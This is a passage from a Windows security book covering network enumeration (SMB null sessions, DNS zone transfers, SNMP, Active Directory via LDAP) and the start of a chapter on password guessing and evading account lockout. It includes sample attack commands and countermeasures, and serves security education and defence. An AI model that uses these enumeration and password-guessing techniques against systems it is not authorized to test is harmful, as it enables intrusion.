sheet, click Internet Protocol   TCP IP   on Vista and later, this is called Internet Protocol Version 4 TCP IPv4 . Then  click the Properties button, and in the ensuing dialog box, click the Advanced button,  navigate to the WINS tab, and locate the setting called Disable NetBIOS Over TCP IP, as  shown in Figure 4-4.   Chapter 4:   Enumeration   97  Figure 4-4  Disabling NetBIOS over TCP IP will disable only TCP 139, leaving the system still  vulnerable to enumeration over TCP 445.  Most users assume that by disabling NetBIOS over TCP IP, they have successfully  disabled SMB access to their machines. This is incorrect. This setting disables only the  NetBIOS Session Service, TCP 139.  Newer Windows versions run another SMB listener on TCP 445. This port will remain  active even if NetBIOS over TCP IP is disabled. Windows SMB client versions later than  NT 4 Service Pack 6a will automatically fail over to TCP 445 if a connection to TCP 139  fails,  so  null  sessions  can  still  be  established  by  up-to-date  clients  even  if  TCP  139  is  disabled or blocked. To disable SMB on TCP 445 on Windows Server 2003 and earlier,  open the Network Connections applet in Control Panel, choose Advanced  Advanced  Settings,  and  then  deselect  File  And  Printer  Sharing  For  Microsoft  Networks  on  the  appropriate adapter. In Vista and later, File And Printer Sharing For Microsoft Networks  can be disabled under the properties of the connection, as shown in Figure 4-5.  With File And Printer Sharing disabled, null sessions will not be possible over 139  and 445  along with File And Printer Sharing, obviously . No reboot is required for this  change to take effect. TCP 139 will still appear in port scans, but no connectivity will be  possible.   98   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 4-5  Disabling SMB completely on Vista, over both TCP 139 and 445  Another way to prevent access to SMB-based services is to disable the Server service via the Services  Administrative tool  services.msc , which turns off File and Print Sharing, restricts access to named  pipes over the network, and disables the IPC$ share. Of course, this disables all resource-sharing  services such as File and Print Sharing.  Configuring “Network Access” in Security Policy  If you need to provide access to SMB  say,  for a domain controller , disabling SMB is not an option. Following the release of NT 4  Service  Pack  3,  Microsoft  attempted  to  defend  against  the  null  session  enumeration  vulnerability by creating the RestrictAnonymous Registry value: HKLM\SYSTEM\CurrentControlSet\Control\LSA\RestrictAnonymous  RestrictAnonymous is a REG_DWORD and can be set to one of three possible values:   0, 1, or 2. These values are described in Table 4-4.   Chapter 4:   Enumeration   99  Value 0 1 2  Security Level None; relies on default permissions Does not allow enumeration of SAM accounts and names No access without explicit anonymous permissions  Table 4-4  RestrictAnonymous Values  With  Windows  2000,  Microsoft  exposed  this  setting  via  the  Security  Policy  MMC  snap-in  secpol.msc , which provided a GUI to the many arcane security-related Registry  settings such as RestrictAnonymous that needed to be configured manually under NT 4.  The setting was called Additional Restrictions for Anonymous Connections in Windows 2000  policy,  and  it  introduced  a  third  value  called  No  Access  Without  Explicit  Anonymous  Permissions.  This is equivalent to setting the RestrictAnonymous Registry value equal to  2; see Table 4-4.  This third option is no longer exposed via the policy interface Windows  XP and later, but the Registry value persists.  Interestingly,  setting  RestrictAnonymous  to  1  does  not  actually  block  anonymous  connections. However, it does prevent most of the information leaks available over the  null  session,  primarily  enumeration  of  user  accounts  and  shares.  As  we’ve  shown  previously, some enumeration tools and techniques will still extract sensitive data from  remote systems, even if RestrictAnonymous is set to 1.  Setting RestrictAnonymous to 2 prevents the special Everyone identity from being  included  in  anonymous  access  tokens.  It  effectively  blocks  null  sessions  from  being  created: C:\>net use \\mgmgrand\ipc$ ""  u:"" System error 5 has occurred. Access is denied.  Setting RestrictAnonymous to this most secure setting  2  has the deleterious effect of  preventing  down-level  client  access  and  trusted  domain  enumeration.   Windows  95  clients can be updated with the dsclient utility to alleviate some of this; see Microsoft KB  article  Q246261  for  more  details.   To  address  these  issues,  the  interface  to  control  anonymous  access  has  been  redesigned  in  Windows  XP  and  later  to  provide  more  granularity and better out-of-the-box security.  The most immediate change visible in the Security Policy’s Security Options node is  that the option Additional Restrictions For Anonymous Connections  which configured  RestrictAnonymous Windows 2000  is gone. Under Windows XP and later, all settings  under  Security  Options  have  been  organized  into  categories.  The  settings  relevant  to  restricting anonymous access fall under the category with the prefix Network Access.  Table 4-5 shows the new settings and our recommended configurations.   100   Hacking Exposed Windows: Windows Security Secrets & Solutions   Windows XP and Later Setting Network Access  Allow  anonymous SID Name translation Network Access  Do not allow  anonymous enumeration of SAM  accounts Network Access  Do not allow  anonymous enumeration of SAM  accounts and shares Network Access  Let Everyone  permissions apply to anonymous  users Network Access  Named pipes  that can be accessed anonymously  Network Access  Remotely  accessible Registry paths Network Access  Remotely  accessible Registry paths and  subpaths Network Access  Restrict  anonymous access to named pipes  and shares Network Access  Shares that can  be accessed anonymously  Recommended Conﬁ guration Disabled  Blocks user2sid and similar  tools  this is enabled on DCs .

Most secure is  to leave this empty.  Enabled  Depends on system role. Empty is most  secure; the default is COMCFG, DFS$.  Table 4-5  Anonymous Access Settings on Windows XP and Later  Looking at Table 4-5, it’s clear that the main additional advantage gained by Windows  XP and later versions is more granular control over resources that are accessible via null  sessions. Providing more options is always better, but we still liked the elegant simplicity  of  Windows  2000’s  RestrictAnonymous  =  2,  because  null  sessions  simply  were  not  possible. Of course, compatibility suffered, but hey, we’re security guys, okay? Simple  always beats complex when it comes to security. At any rate, we were unable to penetrate  the settings outlined in Table 4-5 using the tools discussed in this chapter.  Even better, the settings in Table 4-5 can be applied at the organizational unit  OU ,  site, or domain level so they can be inherited by all child objects in Active Directory if  applied from a Windows domain controller. This requires the Group Policy functionality  of a Windows domain controller, of course.   Chapter 4:   Enumeration   101  By default, Windows domain controllers relax some of the settings that prevent SMB enumeration— see Table 4-5.  Don’t forget to make sure Security Policy is applied, either by right-clicking the Security Settings node  in the MMC and selecting Reload or by refreshing Group Policy on a domain.  WINDOWS DNS ENUMERATION  As we saw in Chapter 3, one of the primary sources of footprinting information is the  Domain  Name  System   DNS ,  the  Internet  standard  protocol  for  matching  host  IP  addresses  with  human-friendly  names  like  amazon.com.  With  the  advent  of  Active  Directory  AD  in Windows 2000, which bases its namespace on DNS, Microsoft revamped  its DNS server implementation to accommodate the needs of AD and vice versa.  Active Directory relies on the DNS SRV record  RFC 2052 , which allows servers to  be  located  by  service  type   for  example,  Global  Catalog,  Kerberos,  and  LDAP   and  protocol   for  example,  TCP .  Thus,  a  simple  zone  transfer  can  enumerate  a  lot  of  interesting network information, as shown next.  Windows 2000 DNS Zone Transfers  Popularity: Simplicity: Impact: Risk Rating:  3 7 2 4  Performing zone transfers is easy using the built-in nslookup tool. In the following  example,  a  zone  transfer  is  executed  against  the  Windows  2000  domain  labfarce.org   edited for brevity and line-wrapped for legibility : C:\>nslookup Default Server: corp-dc.labfarce.org Address: 192.168.234.110 \>> ls -d labfarce.org [[192.168.234.110]]  labfarce.org.

Blocking Windows DNS Zone Transfers By default—you guessed it—Windows 2000 comes configured to allow zone transfers to  any  server.  Fortunately,  Windows  Server  2003  and  later  restricts  zone  transfers  by  default—attackers  will  receive  “Query  refused”  in  response.  Figure  4-6  shows  the  Properties  option  for  a  forward  lookup  zone   in  this  case,  labfarce.org   selected  from  within the DNS Management console  dnsmgmt.msc  on Windows Server 2003, showing  the default setting that restricts zone transfers. Kudos to Microsoft for disabling zone  transfers by default in Windows Server 2003 and later!  Although we recommend the settings shown in Figure 4-6, it is probably more realistic to assume that  backup DNS servers will need to be kept up to date on zone file changes, so we’ll note that permitting  zone transfers to authorized servers is also OK.  Figure 4-6  Windows Server 2003 default DNS settings disable zone transfers—hurrah for default  security!   Chapter 4:   Enumeration   103  Although it won’t work against Windows’ DNS implementation, the following command will deter- mine the version of a server running BIND DNS: nslookup  -q=txt  -class=CHAOS  version.bind.  SNMP ENUMERATION  One of our favorite pen-testing anecdotes concerns the stubborn sysadmin at a client   target  site who insisted that his Windows NT 4 systems couldn’t be broken into. “I’ve  locked down SMB, and there’s no way you can enumerate user account names on my  Windows systems. That’ll stop you cold!”  Sure enough, access to TCP 139 and 445 was blocked or the SMB service was disabled.  However, an earlier port scan showed that something just as juicy was available: the  Simple Network Management Protocol  SNMP  agent service, UDP 161. SNMP is not  installed by default on the Windows, but it is easily added via Add Remove Programs  in Windows 2000 and later. Many organizations manage their networks with SNMP, so  it is commonly found.  In Windows 2000 and earlier, the default installation of SNMP used “public” as the  READ community string  the community string is the rough equivalent of a password  for the service . Even worse, the information that can be extracted from the Windows  SNMP agent is just as damaging as everything we have discussed so far in this chapter.  Boy, was this sysadmin disappointed. Read on to see what we did to his machines—to  ensure that you don’t make the same mistake he did.  The following attacks don’t work on out-of-the-box Windows XP and later thanks to default configuration  changes. Unless noted otherwise, the following descriptions apply to Windows 2000 and prior.  SNMP Enumeration with snmputil  Popularity: Simplicity: Impact: Risk Rating:  8 7 5 7  If  an  easily  guessable  read  community  string  has  been  set  on  the  victim  system,  enumerating Windows accounts via SNMP is a cakewalk using the Resource Kit snmputil  tool.  The  next  example  shows  snmputil  reading  the  LAN  Manager  Management  Information Base  MIB  from a remote Windows 2000 machine using the commonly used  read community string “public”: C:\>snmputil walk 192.168.202.33 public .1.3.6.1.4.1.77.1.2.25 Variable = .iso.org.dod.internet.private.enterprises.lanmanager.            lanmgr-2.server.svUserTable.svUserEntry.svUserName.5.            71.117.101.115.116 Value    = OCTET STRING - Guest   104   Hacking Exposed Windows: Windows Security Secrets & Solutions   Variable = .iso.org.dod.internet.private.enterprises.lanmanager.            lanmgr-2.server. svUserTable.svUserEntry.svUserName.13.            65.100.109.105.110.105.115.116.114.97.116.111.114 Value    = OCTET STRING - Administrator  End of MIB subtree.  The last variable in the preceding snmputil syntax, .1.3.6.1.4.1.77.1.2.25, is  the object identifier  OID  that specifies a specific branch of the Microsoft enterprise MIB,  as defined in SNMP. The MIB is a hierarchical namespace, so walking “up” the tree  that  is, using a less specific number, like .1.3.6.1.4.1.77  will dump larger and larger amounts  of information. Remembering all those numbers is clunky, so an intruder will use the text  string equivalent. Table 4-6 lists some segments of the MIB that yield the juicy stuff.  SNMP Enumeration with SolarWinds Tools  Popularity: Simplicity: Impact: Risk Rating:  8 7 5 7  Of course, to avoid all this typing, you could just download the excellent graphical  SNMP  browser  called  IP  Network  Browser,  one  of  the  many  great  tools  included  in  SolarWinds’ Professional Plus Toolset  see “References and Further Reading” for a link .  The  Professional  Plus  suite  costs  a  bundle,  but  it’s  worth  it  for  the  numerous  tools  included in the package.  IP Network Browser enables an attacker to see all this information displayed in living  color. Figure 4-7 shows IP Network Browser examining a machine running the Windows  2000 SNMP agent with a default read community string of public.  SNMP MIB  Append This to .iso.org.dod.internet.private .enterprises.lanmanager.lanmgr2  .server.svSvcTable.svSvcEntry.svSvcName .server.svShareTable.svShareEntry.svShareName .server.svShareTable.svShareEntry.svSharePath .server.svShareTable.svShareEntry.svShareComment .server.svUserTable.svUserEntry.svUserName .domain.domPrimaryDomain  Enumerated Information  Running services Share names Share paths Comments on shares Usernames Domain name  Table 4-6  OIDs from the Microsoft Enterprise SNMP MIB that Can Be Used to Enumerate  Sensitive Information   Chapter 4:   Enumeration   105  Figure 4-7  SolarWinds’ IP Network Browser expands information available on systems running the  Windows SNMP agent when provided with the correct community string. The community string shown  here is Windows 2000’s default, “public”.  Things  get  even  worse  if  you  identify  a  write  community  string  via  IP  Network  Browser.  Using  the  Update  System  MIB  tool  from  the  SolarWinds  Professional  Plus  Toolset, you can write values to the System MIB if you supply the proper write string,  including system name, location, and contact info.  SNMP Enumeration Countermeasures The simplest way to prevent enumeration activity is to remove the SNMP agent or to  turn off the SNMP service in the Services Control Panel  services.msc . In Vista and later,  the service is known as the SNMP Trap service, and it’s only capable of forwarding to  local SNMP applications, so there are no security settings to configure.  If shutting off SNMP is not an option, you should at least ensure that it is properly  configured with unique community names  not the default “public” used on Windows  2000  so that it responds only to specific IP addresses. This is a typical configuration in  environments that use a single management workstation to poll all devices for SNMP    106   Hacking Exposed Windows: Windows Security Secrets & Solutions   data. To specify these configurations, open the Services Control Panel, select Properties  of the SNMP Service, click the Security tab, and change the following values:  Accepted Community Names  Accept SNMP Packets From These Hosts  Specify unique  nondefault , difﬁ cult-  to-guess community strings Specify the IP address of your SNMP  management workstation s   Figure  4-8  shows  these  settings  in  the  default  Windows  Server  2003  SNMP  agent  configuration. We are happy to report that the default configuration specifies no valid  community strings and restricts access to the SNMP agent to the local host only—another  shining example of Microsoft’s Trustworthy Computing initiative’s “Secure by Default”  mantra. Of course, most administrators will have to make changes to these values to  make the SNMP service useful, but at least it’s locked down out of the box.  Of course, if you’re using SNMP to manage your network, make sure that you block  access  to  TCP  and  UDP  ports  161   SNMP  GET SET   at  all  perimeter  network  access  devices. Allowing internal SNMP info to leak onto public networks is a definite no-no.  Figure 4-8  The Windows Server 2003 SNMP agent’s default conﬁ guration speciﬁ es no valid  community strings and locks down access to localhost only.   Chapter 4:   Enumeration   107  For more advanced administrators, you can also configure the Windows Server 2003  SNMP service to permit only approved access to the SNMP Community Name and to  prevent Windows account information from being sent. To do this, open regedt32 and go  to HKLM\System\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities.  Choose Security  Permissions, and then set them to permit only approved users access.  Next,  navigate  to  HKLM\System\CurrentControlSet\Services\SNMP\Parameters\  ExtensionAgents,  delete  the  value  that  contains  the  “LANManagerMIB2Agent”  string,  and then rename the remaining entries to update the sequence. For example, if the deleted  value was 1, then rename 2, 3, and so on, until the sequence begins with 1 and ends with  the total number of values in the list.  ACTIVE DIRECTORY ENUMERATION  The  most  fundamental  change  introduced  by  Windows  2000  was  the  addition  of  a  Lightweight Directory Access Protocol  LDAP –based directory service that Microsoft  calls Active Directory  AD . AD is designed to contain a unified, logical representation of  all  the  objects  relevant  to  the  corporate  technology  infrastructure,  and  thus,  from  an  enumeration  perspective,  it  is  potentially  a  prime  source  of  information  leakage.  Windows  Server  2003  and  Server  2008’s AD  implementations  are  largely  identical  to  their predecessor and thus can be accessed by LDAP query tools, as shown in the next  example.  Active Directory Enumeration with ldp  Popularity: Simplicity: Impact: Risk Rating:  2 2 5 3  The Windows Support Tools  available on the Server install CD in the Support\Tools  folder  includes a simple LDAP client called ldp.exe that connects to an AD server and  browses the contents of the directory.  While analyzing the security of Windows 2000 release candidates during the summer  of 1999, the authors of this book found that by simply pointing ldp at a Windows 2000  domain controller, all of the existing users and groups could be enumerated with a simple LDAP  query. The only task required to perform this enumeration is to create an authenticated  session via LDAP. If an attacker has already compromised an existing account on the  target via other means, LDAP can provide an alternative mechanism to enumerate users  if SMB ports are blocked or otherwise unavailable.  We illustrate enumeration of users and groups using ldp in the following example,  which targets the Windows domain controller caesars.vegas.nv, whose AD root context  is DC=vegas,DC=nv. We assume that we have already compromised the Guest account  on caesars—it has a password of guest.     1.  Connect to the target using ldp. Choose Connection  Connect, and enter the  IP address or DNS name of the target server. This creates an unauthenticated    108   Hacking Exposed Windows: Windows Security Secrets & Solutions   connection to the directory. You can connect to the default LDAP port 389 or  use the AD Global Catalog port 3268 or the UDP versions of either of these  services  “connectionless” . TCP port 389 is shown in the following illustration:     2.  The null connection reveals some information about the directory, but you can  authenticate as your compromised Guest user and get even more. This is done  by choosing Connections  Bind, making sure the Domain check box is selected  with the proper domain name, and entering Guest’s credentials, as shown next:     3.  You should see output reading “Authenticated as dn: ‘guest’.” Now that an   authenticated LDAP session is established, you can actually enumerate Users  and Groups. Choose View  Tree and enter the root context in the ensuing  dialog box.  For example, DC=vegas,DC=nv is shown here.         4.  A node appears in the left pane; click the plus symbol to unfold it to reveal the   base objects under the root of the directory.  5.  Finally, double-click both the CN=Users and CN=Builtin containers. They will   unfold to enumerate all the users and all the built-in groups on the server,  respectively. The Users container is displayed in Figure 4-9.   Chapter 4:   Enumeration   109  Figure 4-9  Ldp.exe enumerates users and groups via an authenticated connection.  How is this possible with a simple user connection? Certain legacy NT 4 services,  such as Remote Access Service  RAS  and SQL Server, must be able to query user and  group objects within AD. The AD installation routine  dcpromo  prompts whether the  user wants to relax access permissions on the directory to allow legacy servers to perform  these  lookups.  If  the  relaxed  permissions  are  selected  at  installation,  user  and  group  objects are accessible to enumeration via LDAP. Note that the default installation will  relax the permissions over AD.  Active Directory Enumeration Countermeasures First and foremost, filter access to TCP ports 389 and 3268 at the network edge. Unless  you plan on exporting AD to the world, no one should have unauthenticated access to  the directory.  To  prevent  this  information  from  leaking  out  to  unauthorized  parties  on  internal  semitrusted  networks,  permissions  on  AD  will  need  to  be  restricted.  The  difference  between legacy-compatible mode  read: “less secure”  and native Windows essentially  boils down to the membership of the built-in local group Pre-Windows 2000 Compatible  Access.  The  Pre-Windows  2000  Compatible  Access  group  has  the  default  access  permission to the directory shown in Table 4-7.  The  Active  Directory  Installation  Wizard  automatically  adds  Everyone  and  the  ANONYMOUS LOGON identity to the Pre-Windows 2000 Compatible Access group if    110   Hacking Exposed Windows: Windows Security Secrets & Solutions   Object Domain password and lockout policies Other domain parameters Directory root  and all children  User objects  Group objects  InetOrgPerson objects  Permission Read Read List contents List Contents, Read  All Properties, Read Permissions List Contents, Read  All Properties, Read Permissions List Contents, Read  All Properties, Read Permissions  Table 4-7  Permissions on Active Directory Objects Related to the Pre-Windows 2000 Compatible  Access Group  you select Pre-Windows Compatible during dcpromo. These special identities include  authenticated sessions with anyone, including null sessions  see Chapter 2 . By removing  the Everyone and ANONYMOUS LOGON groups from Pre-Windows 2000 Compatible  Access  and then rebooting the domain controllers , the domain operates with the greater  security. If you need to downgrade security again for some reason, these groups can be  re-added by running the following command at a command prompt: net localgroup "Pre-Windows 2000 Compatible Access" everyone  add net localgroup "Pre-Windows 2000 Compatible Access" "ANONYMOUS LOGON"  add  The  access  control  dictated  by  membership  in  the  Pre-Windows  2000  Compatible  Access group also applies to queries run over NetBIOS null sessions against a domain  controller.  To  illustrate  this  point,  consider  the  two  uses  of  the  enum  tool   described  previously  in the following example. The first time it is run against a Windows 2000  Advanced Server with Everyone and ANONYMOUS LOGON as a member of the Pre- Windows 2000 Compatible Access group. C:\>enum -U caesars server: caesars setting up session... success. getting user list  pass 1, index 0 ... success, got 8.   Administrator  backadmin  Guest  guest2  IUSR_CAESARS  IWAM_CAESARS   krbtgt  SUPPORT_388945a0 cleaning up... success.  Now we remove Everyone and ANONYMOUS LOGON from the Pre-Windows 2000   Compatible Access group, reboot, and run the same enum query again: C:\>enum -U caesars server: caesars setting up session... success.   Chapter 4:   Enumeration   111  getting user list  pass 1, index 0 ... fail return 5, Access is denied. cleaning up... success.  Seriously  consider  upgrading  all  RAS,  Routing  and  Remote  Access  Service   RRAS ,  and  SQL  Servers in your organization to at least Windows 2000 before the migration to AD so that casual  browsing of account information can be blocked.  ALL-IN-ONE ENUMERATION TOOLS  We’ve discussed a wide range of enumeration tools and techniques. Wouldn’t it be nice  if all of this functionality was included in one tool, so that network administrators had a  one-stop shop for finding leaky systems on their networks?  Fortunately such a tool exists in Winfingerprint, which can perform nearly all of the  enumeration techniques shown in this chapter, including NetBIOS, SMB, MSRPC, SNMP,  and Active  Directory.  Winfingerprint  is  show  in  Figure  4-10  enumerating  a  Windows   Figure 4-10  Winﬁ ngerprint enumerates a Windows Server 2008 Enterprise domain controller.   112   Hacking Exposed Windows: Windows Security Secrets & Solutions   Server  2008  Enterprise  domain  controller   again,  remember  that  Server  2003  domain  controllers are still vulnerable to these techniques, even though post-XP SP2 non-domain  joined domain member systems block them by default .  SUMMARY  Using  the  information  presented  in  this  chapter,  an  attacker  can  now  turn  to  active  Windows system penetration, as we describe next in Chapter 5. Here is a short review of  the countermeasures presented in this chapter that will restrict malicious hackers from  getting at this information:     Restrict network access to all of the services discussed in this chapter using  network- and host-based ﬁ rewalls  such as the Windows Firewall . Disable  these services if they are not being used. If you do enable these services,  conﬁ gure them to prevent disclosure of sensitive system information to  unauthorized parties according to the following advice.     Protect the SMB service  TCP UDP 139 and 445 . Disable it if possible by shutting   off File And Print Sharing For Microsoft Networks as discussed in this chapter.  If you enable SMB, use Security Policy to prevent anonymous access. Windows  default settings are sufﬁ cient, but beware that the default domain controller  settings are relaxed and permit enumeration of accounts. You can push these  settings out to all domain computers using Group Policy.     Access to the NetBIOS Name Service  NBNS, UDP 137  should be blocked  at network gateways  recognize that blocking UDP 137 will interfere with  Windows naming services .     Disable the Alerter and Messenger services on NetBIOS-aware hosts. This   prevents user account information from appearing in remote NetBIOS Name  Table dumps. This setting can be propagated throughout a domain using Group  Policy. These services are disabled by default on Windows Server 2003 and later.    Conﬁ gure Windows DNS servers to restrict zone transfers to explicitly deﬁ ned  hosts, or disable zone transfers entirely. Zone transfers are disabled by default  in Windows Server 2003 and later.     If you enable the optional SNMP Service, restrict access to valid SNMP  management console machines and specify non-default, hard-to-guess  community strings. The Windows Server 2003 SNMP Service restricts access  to the local host and speciﬁ es no valid community strings by default. SNMP  is no longer implemented on Vista and later.     Heavily restrict access to the AD-speciﬁ c services, TCP UDP 389 and 3268.   Use network ﬁ rewalls, Windows Firewall, IPSec ﬁ lters, or any other mechanism  available.     Remove the Everyone identity from the Pre-Windows 2000 Compatible Access  group on Windows domain controllers if applicable. This is a backward  compatibility mode to allow NT RAS and SQL services to access user objects    Chapter 4:   Enumeration   113  in the directory. If you don’t require this legacy compatibility, turn it off. Plan  your migration to Active Directory so that RAS and SQL servers are upgraded  ﬁ rst and you do not need to run in backward compatibility mode.

The next step is to  attempt to break in using various methods.  As discussed in Chapter 2, the primary goal of remote Windows system penetration  is to authenticate to the remote host to get access to resources on it. We can do this, for  example, in the following ways:     Guessing username password combinations    Eavesdropping on or subverting the authentication process    Exploiting a vulnerable network service or client    Gaining physical access to the system  This chapter will discuss the first three items on this list, and physical attacks will be   discussed in Chapter 11.  SQL Server will be discussed separately in Chapter 9.  As we saw in Chapter 2, the core of the Windows authentication system includes the  LAN  Manager   LM   and  Windows  NT  LAN  Manager   NTLM   protocols   including  NTLM  version  2 .  These  protocols  were  designed  primarily  for  a  protected  internal  environment.  With  Windows  2000,  Microsoft  adopted  the  widely  used  standard  Kerberos version 5 protocol as an alternative to LM and NTLM, effectively broadening  the scope of its authentication paradigm, and also in part to blunt longstanding criticism  of security weaknesses in the proprietary LM NTLM suite. All of these protocols  are available by default in Windows  Kerberos is used nowadays for authentication  on  domain  controllers  and  accessing  resources  on  the  network ,  but  little  has  been  changed  to  eliminate  the  weaknesses  in  LM NTLM,  mainly  to  maintain  backward  compatibility.  Luckily, with Windows Vista, Microsoft uses NTLMv2 as the default authentication  scheme,  following  the  earlier  change  on  Windows  2003  disabling  LM  by  default. All  these protocols are used more or less transparently by modern Windows clients, so the  details of how they work are often irrelevant to attacks such as password guessing in  most cases. Furthermore, as we will see in this chapter, Microsoft has replicated known  security  vulnerabilities  in  the  public  Kerberos  v5  standard,  which  is  also  prone  to  password-guessing attacks. This chapter is divided into the following sections:     Guessing passwords    Eavesdropping on authentication    Subverting authentication via rogue server or man-in-the-middle  MITM  attacks    Attacking vulnerabilities in Windows services   Chapter 5:  Hacking Windows-Specific Services   117  GUESSING PASSWORDS  As unglamorous as it sounds, password guessing is probably one of the most effective  methods for gaining access to larger Windows and *nix networks. This section discusses  this inelegant but highly effective approach to Windows system penetration.  Password  guessing  can  be  performed  against  all  services  supporting  integrated  Windows  authentication  including,  but  not  limited  to,  services  such  as  Internet  Information Services  IIS , Remote Procedure Call  RPC , and FTP servers. In this chapter  we focus on password guessing over the Server Message Block  SMB  protocol, but an  attack can also be performed against any service for which we have a client allowing us  to supply a username and password. On top of that, when gaining access with some  credentials via some protocol, it is usually worthwhile to try the same credentials via  other services, as people tend to reuse their passwords. This is mainly due to tedious  requirements for password strength and the difficulty of having to remember complex  passwords. For example, if an intruder manages to break into an FTP service with some  user credentials, she could use the same credentials to break into another service, such as  Windows authentication.  Naturally, the password guessing depends on the complexity of the password; if the  user is using passphrases, the difficulty in guessing the password grows linearly. Luckily  for attackers, and due to usual complex demands for the passwords, users tend to reuse  passwords in different systems.  Before we discuss the various tools and techniques used for password guessing, let’s   review a few salient points:     Closing existing SMB sessions to target    Reviewing enumeration output    Avoiding account lockout    The importance of the administrative and privileged accounts  Close Existing SMB Sessions to Target  Before beginning password guessing against systems that have been enumerated, a little  housekeeping  is  in  order.  Since  Windows  does  not  support  logging  on  with  multiple  credentials simultaneously in the same SMB namespace, we must log off any existing  sessions to the target by using the net use  delete  y command  or  d for short;  the  y switch forces the connections closed without prompting : C:\>net use *  d  y You have these remote connections:                      \\victim.com\ipc$ Continuing will cancel the connections.  The command completed successfully.   118   Hacking Exposed Windows: Windows Security Secrets & Solutions   And, of course, if you have sessions open to multiple machines, you can close specific  connections by explicitly noting them in the request. Here we close a session with the  computer \\victim: C:\>net use \\victim\ipc$  d  y  The net command supports multiple network providers—for example Novell NetWare and others.  When  referring  to  the net  command  in  this  book,  we  imply  SMB  and Windows  connections.  IP  addresses are also considered a separate namespace.  Review Enumeration Results  The efficiency of password guessing is greatly increased by information gathered using  the enumeration techniques discussed in Chapter 4. Assuming that user account names  and features can be obtained by these techniques, they should be reviewed with an eye  toward identifying the following information extracted over null sessions by tools such  as enum, nete, userdump userinfo, and DumpSec  see Chapter 4 . This information can  be used in manual password-guessing attacks, or it can be salted liberally in username  lists and password dictionaries fed into automated password-guessing tools.  Local  vs.  Domain  Accounts  For  each  account  enumerated,  it  is  good  practice  to  check  which are domain accounts and which are for local use only. Membership can also be  seen from the group memberships. Domain accounts can provide footholds from one  system to another—getting system access to one box can provide access to that box only,  but  using  that  account  to  spawn  processes  with  logged-on  domain  users  allows  an  intruder to take over the entire domain or forest, depending on the account.  Lab or Test Accounts  How many lab or test accounts exist in your environment? How  many of these accounts are in the local Administrators group? Care to guess what the  password for such accounts might be? It could be test, or, on systems with no password  policy enforcement, it could even be NULL. To make matters worse, these accounts— even admin accounts—can set passwords that never expire. It is not uncommon to find  systems  with  passwords  set  months  or  even  years  ago—even  brute-forcing  can  be  valuable for cracking stronger passwords within such an environment.  User Accounts with Juicy Info in the Comment Field  We’ve actually seen passwords written  in  the  Comment  field  in  plaintext,  ripe  for  the  plucking  via  enumeration.  Sometimes  hints to the password can be found in the Comment field to aid those hapless users who  just can’t seem to remember their own passwords.  Administrators  or  Domain  Admins  Groups  These  accounts  are  often  targeted  because  of  their all-encompassing power over local systems or domains. Also, the local Administrator  account cannot be locked out using default tools from Microsoft, and they make ripe  targets for perpetual password guessing. The account has been renamed or disabled on  later versions of Microsoft Windows.  Local administrator accounts might also use the same password for multiple systems,  especially if the systems have been installed from one  and the same  golden image. This    Chapter 5:  Hacking Windows-Specific Services   119  gives the advantage to the attacker who can use the same local account to compromise  all the accounts on the network.  Privileged  Backup  Application  Service  Accounts  Many  commercial  backup  software  applications create user accounts that are granted a high degree of privilege on a system,  or that at least can read almost all of the files to provide a comprehensive backup of  the  system.  Some  common  account  names  are  shown  in  Table  5-1  a  little  later  in  the  chapter.  Shared Group Accounts  Organizations large and small have a propensity to reuse account  credentials that grant access to a high percentage of the systems in a given environment.  Account names such as backup or admin are examples.  User Accounts Haven’t Changed Passwords Recently  This is typically a sign of noneffective  account maintenance practices on the part of the user and system administrator, indicating  a  potentially  easy  mark.  These  accounts  may  also  use  default  passwords  specified  at  account creation time that are easily guessed. For example, the use of the organization  name, username, or welcome for this initial password value is rampant.  User  Accounts  Haven’t  Logged  on  Recently  Once  again,  infrequently  used  accounts  are  signs of neglectful practices such as infrequently monitored password strength, or rather  account management housekeeping.  Avoid Account Lockout  Hackers  and  authorized  penetration  testers  alike  will  want  to  avoid  account  lockout  when  engaging  in  password  guessing.  Lockout  disables  the  account  and  makes  it  unavailable  for  further  attacks  for  the  duration  of  the  lockout  period  specified  by  a  system  administrator.   Note  that  a  locked-out  account  is  different  from  a  disabled  account, which is unavailable until enabled by an administrator.   Plus, if auditing has been enabled, lockout shows up in the logs and will typically  alert administrators and users that someone is messing with their accounts. Furthermore,  if the machine is running a host-based intrusion detection application, chances are that  the number of failed logins may trigger an alert that is sent to the security operations  team.  How  can  you  identify  whether  account  lockout  will  derail  a  password-guessing  audit?  The  cleanest  way  to  determine  the  lockout  policy  of  a  remote  system  is  to  enumerate it via a null session. Recall from Chapter 4 that it’s possible to enumerate the  lockout threshold if a null session is available. This is the most direct way to determine  whether an account lockout threshold exists.  Recall that enumeration of password policies is disabled by default in newer Windows versions, unless  the system is a domain controller.  If  for  some  reason  the  password  policy  cannot  be  divined  directly,  another  clever  approach is to attempt password guesses against the Guest account first. As noted in    120   Hacking Exposed Windows: Windows Security Secrets & Solutions   Chapter  2,  Guest  is  disabled  by  default  on  Windows,  but  if  you  reach  the  lockout  threshold, you will be notified, nevertheless. Following is an example of what happens  when the Guest account gets locked out. The first password guess against the arbitrarily  chosen IPC$ share on the target server fails, pushing the number of attempts over the  lockout threshold specified by the security policy for this machine: C:\>net use \\mgmgrand\ipc$ *  u:guest Type the password for \\mgmgrand\ipc$: System error 1326 has occurred.  Logon failure: unknown user name or bad password.  Once the lockout threshold has been exceeded, the next guess tells us that Guest is   locked out, even though it is disabled: C:\>net use \\mgmgrand\ipc$ *  u:guest Type the password for \\mgmgrand\ipc$: System error 1909 has occurred. The referenced account is currently locked out and may not be logged on to.  Also note that when guessing passwords against Guest  or any other account , you will  receive a different error message if you actually guess the correct password for a disabled  account: C:\>net use \\mgmgrand\ipc$ *  u:guest Type the password for \\mgmgrand\ipc$: System error 1331 has occurred.  Logon failure: account currently disabled.  Amazingly, the Guest account has a blank password by default on Windows. Thus, if  you continuously try guessing a NULL password for the Guest account, you’ll never  reach the lockout threshold  unless the password has been changed . If failure of account  logon events is enabled, an “account disabled” error message will appear, even if you  guess the correct password for a disabled account.  Making Guest Less Useful Of course, disabling access to logon services is the best way to prevent password guessing,  but assuming this is not an option, how can you prevent the Guest account from being  so useful to remote attackers? You can delete it using the DelGuest utility from Arne  Vidstrom  see “References and Further Reading” at the end of this chapter . DelGuest is  not supported by Microsoft and may produce unpredictable results  although the authors  have used it on Windows 2000 Professional for more than a year with no problem .  If deleting the Guest account is not an option, try locking it out. That way, guessing  passwords against it won’t give away 